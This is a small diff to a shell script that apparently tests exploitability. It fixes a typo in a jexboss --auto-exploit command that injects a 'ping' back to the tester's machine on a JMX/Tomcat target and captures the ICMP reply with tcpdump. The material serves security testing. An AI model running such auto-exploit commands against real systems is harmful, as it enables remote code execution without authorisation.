@@ -59,7 +59,7 @@ sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &"
 
 print_info "Running jexboss command for target Windows:"
 print_info "python2.7 jexboss.py --auto-exploit --jmxtomcat -u ${IP}:${PORT} --windows --cmd \"ping ${LOCALIP}\""
-python2.7 jexboss.py --auto-exploit --jmxtomcat -u ${IP}:${PORT} --windows --cmd "ping -${LOCALIP}" > /tmp/jexboss-output.txt
+python2.7 jexboss.py --auto-exploit --jmxtomcat -u ${IP}:${PORT} --windows --cmd "ping ${LOCALIP}" > /tmp/jexboss-output.txt
 tail -n +4 /tmp/jexboss-output.txt
 rm /tmp/jexboss-output.txt
 
